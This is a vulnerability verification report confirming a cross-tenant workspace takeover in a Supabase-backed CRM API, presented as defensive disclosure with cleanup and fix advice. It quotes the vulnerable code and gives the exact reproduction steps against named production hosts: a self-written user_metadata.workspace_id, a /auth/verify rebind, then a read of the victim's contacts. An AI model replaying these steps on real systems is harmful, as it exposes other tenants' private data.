# Refutation attempt — Cross-tenant workspace takeover via user-writable Supabase user_metadata.workspace_id (NovaCRM)

VERDICT: UPHELD (finding survives refutation). Severity: CRITICAL — confirmed end-to-end against PROD.

Refutation attempts (overstated? mitigated elsewhere? env-specific? false positive?) all FAILED.
The claim is accurate, including its negative control. Re-verified by fresh static read of cited
file:line and a fresh live reproduction with my own clearly-namespaced TEST users, fully cleaned up.

Source tree: /tmp/crm-signup-fix/apps/api
Targets: API https://api-production-c080.up.railway.app ; Supabase https://ilfibxflnelssllgszex.supabase.co
All HTTP codes observed and pasted below.

================================================================================
1. STATIC CONFIRMATION (cited lines match verbatim)
================================================================================

app/routers/auth.py  POST /auth/verify — reconcile branch (lines 100-109):
    # Reconcile: if the JWT now carries a different workspace_id ...
    if meta_ws_id_str and meta_ws_id_str != str(user.workspace_id):
        try:
            new_ws_id = uuid.UUID(meta_ws_id_str)
            user.workspace_id = new_ws_id      # <-- NO membership/authz check
            await db.commit()
  meta_ws_id_str comes from payload["user_metadata"]["workspace_id"] (auth.py:75-76),
  i.e. client-writable Supabase user_metadata. Only validation is "differs" + "parses as UUID".

app/dependencies.py  get_current_user auto-provision (lines 44-77):
  user_meta = payload.get("user_metadata", {}); workspace_id_str = user_meta.get("workspace_id")
  -> creates/uses Workspace(id=workspace_id) and User(workspace_id=workspace_id, role="admin")
  Same untrusted-metadata trust on first-login path.

Guard pattern (every workspace-scoped route, e.g. contacts.py:61-62, workspaces.py:42-43, deals.py, calls.py, ai.py, projects.py, slack.py):
    if current_user.workspace_id != workspace_id:
        raise HTTPException(403, "Access denied")
  The guard is REAL and trusts current_user.workspace_id — which the reconcile branch overwrites
  to any attacker-named value. Legit path POST /workspaces (workspaces.py:91 + _sync_workspace_metadata)
  shows the app *intends* current_user.workspace_id to be the sole tenant authority.

JWT verification (services/auth.py): ES256/RS256 via JWKS, require sub/exp/iat. user_metadata IS inside
  the signed payload, so a self-asserted workspace_id survives signature verification untouched.

================================================================================
2. PRECONDITION CHECKS (live)
================================================================================

GET https://ilfibxflnelssllgszex.supabase.co/auth/v1/settings  -> HTTP 200
  "disable_signup": false        <- open email signup (attacker can self-register)
  "mailer_autoconfirm": false    <- minor: attacker must confirm email (trivial precondition, not a mitigation)
  "external.email": true

================================================================================
3. LIVE REPRODUCTION (my own namespaced TEST users; both deleted afterward)
================================================================================
Creds used by the "attacker": ONLY the public anon key + the attacker's own user token.
No service key / no admin creds used in any attack step (service key used only for TEST setup+cleanup).

Attacker test user: verifier-test-1780528084@refute-test.example  supabase uid c9d2bc92-42b8-4d3d-a51a-93511f174349
Victim   test user: verifier-victim-1780528151@refute-test.example supabase uid 3ef9e266-388e-45c1-9650-9e5d2c8a4283

-- Victim provisioned via the REAL onboarding path --
victim POST /auth/verify                       -> HTTP 200
victim POST /workspaces                         -> HTTP 201  id 9148521d-0ac3-4fb7-bba6-b186b8f56336  (= VICTIM_WS)
victim POST /workspaces/<VICTIM_WS>/contacts    -> HTTP 201  id e8327e1e-6113-45ab-8d85-40162ccbfca8  "SECRET VERIFIER CONTACT"

-- Attacker, already provisioned in API DB (own ws 0eb3b4a0-...) so the RECONCILE branch fires --
JWT user_metadata BEFORE write: {"email_verified": true}   (no workspace_id)

STEP 2 (PIVOTAL) self-write, anon key + own token only:
  PUT https://ilfibxflnelssllgszex.supabase.co/auth/v1/user  body {"data":{"workspace_id":"9148521d-..."}}
    -> HTTP 200
    returned user_metadata = {"email_verified": true, "workspace_id": "9148521d-0ac3-4fb7-bba6-b186b8f56336"}
  GoTrue ACCEPTED the self-write. Project does NOT lock user_metadata.

  Fresh login -> signed JWT, sub=c9d2bc92..., user_metadata.workspace_id = 9148521d-...  (attacker-asserted value is in a VALID signed token)

STEP 3 reconcile:
  POST https://api-production-c080.up.railway.app/auth/verify  (attacker token)
    -> HTTP 200  {"user_id":"105e609c-...","workspace_id":"9148521d-0ac3-4fb7-bba6-b186b8f56336"}
    (attacker's DB row rebound to the VICTIM's workspace — no authz check)
  GET /me (attacker)
    -> HTTP 200  {"id":"105e609c-...","email":"verifier-test-...","workspace_id":"9148521d-...","role":"admin"}

ATTACK READ (cross-tenant exfiltration):
  GET /workspaces/9148521d-.../contacts (attacker)
    -> HTTP 200
    body: [{"id":"e8327e1e-...","workspace_id":"9148521d-...","name":"SECRET VERIFIER CONTACT","email":"secret@verifier-victim.example",...}]
    => attacker read a different user's contact in a workspace it has no legitimate claim to.

NEGATIVE CONTROL (matches claim exactly):
  GET /workspaces/dddddddd-eeee-ffff-aaaa-bbbbbbbbbbbb/contacts (attacker, random ws never asserted)
    -> HTTP 403  {"detail":"Access denied"}
  The guard genuinely blocks unrelated workspaces; ONLY the self-asserted metadata write defeats it.

NOTE on branches (refinement, not a refutation): if the attacker account does NOT yet exist in the API DB,
the first POST /auth/verify takes the AUTO-PROVISION branch (auth.py:84) which mints a brand-new workspace
and ignores the metadata. The takeover requires the account to already exist (one prior /auth/verify), so the
RECONCILE branch (auth.py:102-105) fires. This is a trivial one-call precondition and is exactly how the
original evidence (pre-provisioned user A) staged it. The exploit stands.

================================================================================
4. CLEANUP (verified — nothing left behind)
================================================================================
DB single-transaction delete scoped to 3 test workspaces
  (0eb3b4a0-... attacker, 658826e5-... victim auto-prov, 9148521d-... victim onboarding)
  and 2 test users:
    DELETE 1 activity_events, 0 deals, 1 contacts, 21 agents, 2 users, 3 workspaces  (COMMIT)
  Post-check residue (all 0): users_by_uid=0, users_by_email=0, ws_by_id=0, ws_by_name=0,
                              contacts=0, deals=0, agents=0, events=0
Supabase auth:
    DELETE attacker -> HTTP 200 ; DELETE victim -> HTTP 200
    GET attacker -> 404 ; GET victim -> 404
    email-filter verifier-test... -> 0 users ; verifier-victim... -> 0 users ; refute-test.example -> 0 users
No real (non-test) data touched. No load/DoS. Single proof-of-concept requests only.

================================================================================
5. ROOT CAUSE / FIX DIRECTION
================================================================================
app/routers/auth.py POST /auth/verify reconcile branch trusts client-writable user_metadata.workspace_id
with no membership check; app/dependencies.py get_current_user repeats the trust on auto-provision.
Either (a) lock user_metadata in GoTrue so users can't self-write workspace_id, and/or (b) stop deriving
tenant from user_metadata: bind workspace via a server-side membership table and authorize against it,
never via a client-mutable JWT claim. App_metadata (admin-only writable) would be the correct GoTrue field
if a claim must live in the token.
